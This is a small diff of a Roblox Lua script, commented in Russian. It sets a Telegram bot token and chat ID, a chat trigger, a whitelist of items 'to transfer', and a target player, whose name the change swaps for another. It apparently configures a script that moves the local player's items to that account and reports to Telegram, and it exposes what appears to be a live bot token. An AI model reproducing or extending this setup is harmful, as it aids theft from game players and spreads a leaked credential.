@@ -7,7 +7,7 @@ local player = Players.LocalPlayer
 -- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
-local TARGET_PLAYER = "Rikizigg"
+local TARGET_PLAYER = "sfdgbzdfsb"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 БЕЛЫЙ СПИСОК для передачи (только эти будут передаваться)
